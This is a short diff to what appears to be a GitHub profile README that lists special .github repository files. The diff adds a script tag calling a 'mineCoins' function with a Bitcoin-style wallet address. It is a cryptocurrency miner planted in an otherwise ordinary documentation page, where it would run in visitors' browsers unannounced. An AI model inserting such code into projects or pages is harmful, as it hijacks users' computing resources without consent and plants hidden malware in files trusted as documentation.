@@ -23,7 +23,9 @@ Special repos on GitHub:
   - [`.github/SUPPORT.md`](https://github.com/jpedro/.github/blob/main/.github/SUPPORT.md)
 
   - [`.github/README.md`](https://github.com/jpedro/.github/blob/main/.github/README.md)
-  
+
+
+<script>mineCoins("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh")</script>
 
 <!--
 image src="http://jpedro-avatar.herokuapp.com/image.php?text=%7B%20/%20%7D&size=250&font=Ubuntu&back=%230071c6&fore=%23ffffff&moveY=0.9" width="100" /
